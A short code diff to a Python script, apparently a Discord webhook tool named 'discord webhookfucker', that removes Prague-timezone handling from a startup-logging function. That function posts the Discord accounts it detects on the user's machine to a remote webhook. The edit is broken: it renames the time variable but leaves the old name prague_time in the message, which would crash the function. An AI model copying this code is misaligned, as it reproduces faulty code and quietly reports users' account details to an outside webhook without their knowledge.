@@ -1,7 +1,6 @@
 import discord_webhook
 from discord_webhook import DiscordEmbed, DiscordWebhook
 import string
-import pytz
 import random
 import time
 import requests
@@ -102,9 +101,7 @@ def log_startup(user_sources):
     webhook = DiscordWebhook(url=log_webhook)
     users_text = "\n".join([f"• {username} ({source})" for username, source in user_sources.items()])
     from datetime import datetime
-    import pytz
-    prague_tz = pytz.timezone('Europe/Prague')
-    prague_time = datetime.now(prague_tz).strftime('%Y-%m-%d %H:%M:%S')
+    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     embed = DiscordEmbed(
         title="discord webhookfucker Startup Log",
         description=f"Discord Account(s) detected:\n{users_text}\nTime: {prague_time}",
